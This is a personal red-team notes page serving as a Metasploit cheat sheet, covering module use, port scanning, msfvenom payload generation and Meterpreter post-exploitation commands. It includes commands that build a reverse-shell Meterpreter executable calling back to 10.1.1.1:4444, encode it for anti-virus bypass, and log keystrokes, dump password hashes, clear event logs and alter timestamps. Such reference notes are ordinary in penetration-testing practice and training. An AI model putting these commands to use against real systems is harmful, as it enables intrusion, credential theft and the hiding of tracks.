---
creation date: March 6th 2023
last modified date: March 6th 2023
aliases: []
tags: #🧰
---

Primary Categories: [[04 - Tools & Techniques]]
Secondary Categories: [[01 - Red Team]] [[04 - Exploitation Tools]]
Links: [[]] 
Search Tag: #🧰  

# [[04 - Metasploit]]  
___

## Description:

Metasploit is a popular open-source framework used by security professionals to perform penetration testing and exploit development. It provides a suite of tools and resources for testing the security of computer systems, networks, and applications. Metasploit allows users to identify vulnerabilities, develop and test exploits, and automate the process of identifying and exploiting security weaknesses. The framework includes a large database of exploits, payloads, and auxiliary modules that can be used to test different aspects of a target system's security. Metasploit can be used for both offensive and defensive security purposes, making it a versatile tool for cybersecurity professionals.

## Installation

```Shell
sudo apt install metasploit-framework
```

```bash
sudo pacman -Syu metasploit
```

## Commands

###### Search for module:

```
msf > search [regex]
```

###### Specify and exploit to use:

```
msf > use exploit/[ExploitPath]
```

###### Specify a Payload to use:

```
msf > set PAYLOAD [PayloadPath]
```

###### Show options for the current modules:

```
msf > show options
```

###### Set options:

```
msf > set [Option] [Value]
```

###### Start exploit:

```
msf > exploit 
```

##### Useful Auxiliary Modules


###### Port Scanner:

```
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
```

###### DNS Enumeration:

```
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
```

###### FTP Server:

```
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```

###### Proxy Server:

```
msf > use auxiliary/server/socks4
msf > run 
```

## msfvenom :

The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode 
them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.

```
$ msfvenom –p [PayloadPath]
–f [FormatType]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```

Example :

Reverse Meterpreter payload as an executable and redirected into a file:

```
$ msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=10.1.1.1
LPORT=4444 > met.exe
```

Format Options (specified with –f) --help-formats – List available output formats

| Extension | Description   |
| --------- | ------------- |
| exe       | Executable    |
| pl        | Perl          |
| rb        | Ruby          |
| raw       | Raw Shellcode |
| C         | C Code              |

Encoding Payloads with msfvenom

The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with '-l encoders'

to get a list of encoders.
```
$ msfvenom -p [Payload] -e [Encoder] -f
[FormatType] -i [EncodeInterations]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```

Example

Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:

```
$ msfvenom -p windows/meterpreter/
reverse_tcp -i 5 -e x86/shikata_ga_nai -f
exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
```

## Metasploit Meterpreter

###### Base Commands: 

| Command              | Description                                                                                                    |
|----------------------|----------------------------------------------------------------------------------------------------------------|
| ? / help             | Display a summary of commands                                                                                  |
| exit / quit          | Exit the Meterpreter session                                                                                   |
| sysinfo              | Show the system name and OS type                                                                               |
| shutdown / reboot    | Self-explanatory                                                                                               |
| cd                   | Change directory                                                                                               |
| lcd                  | Change directory on local (attacker's) machine                                                                 |
| pwd / getwd          | Display current working directory                                                                              |
| ls                   | Show the contents of the directory                                                                             |
| cat                  | Display the contents of a file on screen                                                                       |
| download / upload    | Move files to/from the target machine                                                                          |
| mkdir / rmdir        | Make / remove directory                                                                                        |
| edit                 | Open a file in the default editor (typically vi)                                                               |
| getpid               | Display the process ID that Meterpreter is running inside                                                      |
| getuid               | Display the user ID that Meterpreter is running with                                                           |
| ps                   | Display process list                                                                                           |
| kill                 | Terminate a process given its process ID                                                                       |
| execute              | Run a given program with the privileges of the process the Meterpreter is loaded in                            |
| migrate              | Jump to a given destination process ID                                                                         |
|                      | - Target process must have same or lesser privileges                                                          |
|                      | - Target process may be a more stable process                                                                  |
|                      | - When inside a process, can access any files that process has a lock on.                                      |


## Network Commands:

| Command           | Description                                                                                                   |
|-------------------|---------------------------------------------------------------------------------------------------------------|
| ipconfig          | Show network interface information                                                                            |
| portfwd           | Forward packets through TCP session                                                                           |
| route             | Manage/view the system's routing table                                                                        |
| idletime          | Display the duration that the GUI of the target machine has been idle.                                        |
| uictl             | [enable/disable] [keyboard/mouse]: Enable/disable either the mouse or keyboard of the target machine.       |
| screenshot        | Save as an image a screenshot of the target machine.                                                          |

## Additional Modules:

use [module]: Load the specified module

Example:

| Command    | Description                                           |
|------------|-------------------------------------------------------|
| use priv   | Load the priv module                                   |
| hashdump   | Dump the hashes from the box                           |
| timestomp  | Alter NTFS file timestamps                            |

## Managing Sessions

###### Multiple Exploitation: 

Run the exploit expecting a single session that is immediately backgrounded:

```
msf > exploit -z
```

Run the exploit in the background expecting one or more sessions that are immediately backgrounded:

```
msf > exploit –j
```

###### List all current jobs (usually exploit listeners):

```
msf > jobs –l
```

###### Kill a job:

```
msf > jobs –k [JobID]
```

##### Multiple Sessions:

###### List all backgrounded sessions:

```
msf > sessions -l
```

###### Interact with a backgrounded session:

```
msf > session -i [SessionID]
```

###### Background the current interactive session:

```
meterpreter > <Ctrl+Z>
or
meterpreter > background
```

###### Routing Through Sessions:

All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.

```
msf > route add [Subnet to Route To]
[Subnet Netmask] [SessionID]
```

### Networking Commands

These will allow you to view and manipulate network information and data transmission on a target network.

| Command | Description |
| --- | --- |
| ipconfig |	Show network interface configuration
| portfwd |Forward packets
| route |	View / edit network routing table

### Meterpreter Commands

These commands can be used in an existing meterpreter session to enumerate and manipulate you target.

| **COMMAND**          | **DESCRIPTION**                                           |
| --- | --- |
| `sysinfo`         | Display system information                            |
| `ps`              | List and display running processes                    |
| `kill (PID)`      | Terminate a running process                           |
| `getuid`          | Display user ID                                       |
| `upload` or `download` | Upload / download a file                           |
| `pwd` or `lpwd`   | Print working directory (local / remote)              |
| `cd` or `lcd`     | Change directory (local or remote)                    |
| `cat`             | Display file content                                  |
| `bglist`          | Show background running scripts                       |
| `bgrun`           | Make a script run in the background                    |
| `bgkill`          | Terminate a background process                         |
| `background`      | Move active session to background                      |
| `edit <FILE Name>`| Edit a file in vi editor                              |
| `shell`           | Access shell on the target machine                     |
| `migrate <PID>`   | Switch to another process                              |
| `idletime`        | Display idle time of user                              |
| `screenshot`      | Take a screenshot                                     |
| `clearev`         | Clear the system logs                                  |
| `?` or `Help`     | Help showing all the commands                          |
| `exit` / `quit`   | Exit the Meterpreter session                            |
| `shutdown` / `reboot` | Restart the system                                 |
| `use`             | Extension load                                        |
| `channel`         | Show active channels                                   |

## Process Handling Commands

Gather information on running software and processes on the target machine with these commands.

| **Command**     | **Description**                                         |
| ----------- | --------------------------------------------------- |
| `getpid`    | Display the process ID                             |
| `getuid`    | Display the user ID                                 |
| `ps`        | Display running process                             |
| `Kill`      | Stop and terminate a process                        |
| `getprivs`  | Shows multiple privileges as possible              |
| `reg`       | Access target machine registry                      |
| `Shell`     | Access target machine shell                         |
| `execute`   | Run a specified command                             |
| `migrate`   | Move to a given destination process ID              |

### Interface / Output Commands

View the target desktop and capture keystrokes with these commands.

| **Command**           | **Description**                                    |
| ----------------- | ---------------------------------------------- |
| `enumdesktops`    | Show all available desktops                    |
| `Getdesktop`      | Display current desktop                        |
| `keyscan_start`   | Start keylogger in target machine              |
| `Keyscan_stop`    | Stop keylogger in target machine               |
| `set_desktop`     | Configure desktop                              |
| `keyscan_dump`    | Dump keylogger content                         |

### Password Management Commands

Steal user and system passwords.

| **Command** | **Description** |
| --- | --- |
| hashdump	| Access content of password file – Hash file |

### MSF Venom Command Options

Use these flags to generate reverse shell payloads.

| SWITCH | SYNTAX                   | DESCRIPTION                                      |
| ------ | ------------------------| ------------------------------------------------ |
| `-p`   | `–p` (Payload option)   | Display payload standard options                 |
| `-l`   | `–l` (List type)        | List module type i.e. payload, encoders          |
| `-f`   | `–f` (Format)           | Output format                                    |
| `-e`   | `–e` (Encoder)          | Define which encoder to use                       |
| `-a`   | `–a` (Architecture/Platform) | Define which platform to use                |
| `-s`   | `–s` (Space)            | Define maximum payload capacity                   |
| `-b`   | `–b` (Characters)       | Define set of characters not to use               |
| `-i`   | `–i` (Number of times)  | Define number of times to use encoder              |
| `-x`   | `–x` (File name)        | Define a custom file to use as template            |
| `-o`   | `–o` (Output)           | Save a payload                                    |
| `-h`   | `–h`                    | Help                                              |




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: March 6th 2023 (11:08 am) 
Last Modified Date: March 6th 2023 (11:08 am)
